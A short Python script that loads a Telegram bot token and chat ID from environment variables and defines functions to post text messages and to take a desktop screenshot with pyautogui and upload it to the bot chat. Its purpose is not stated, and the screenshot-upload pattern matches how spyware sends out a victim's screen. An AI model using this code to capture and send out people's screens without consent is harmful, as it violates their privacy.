from dotenv import load_dotenv

import requests
import io
import pyautogui
import os

# Load environment variables from .env
load_dotenv()

# Now get the values
TOKEN = os.getenv("TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

def sendMessage(MESSAGE):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": MESSAGE}

    response = requests.post(url, json=payload)

def sendScreenshot():
    # Take screenshot using pyautogui
    screenshot = pyautogui.screenshot()

    # Save image to memory (BytesIO buffer)
    buffer = io.BytesIO()
    screenshot.save(buffer, format='PNG')
    buffer.seek(0)

    # Send image via Telegram
    url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
    files = {'photo': buffer}
    data = {'chat_id': CHAT_ID}

    response = requests.post(url, files=files, data=data)
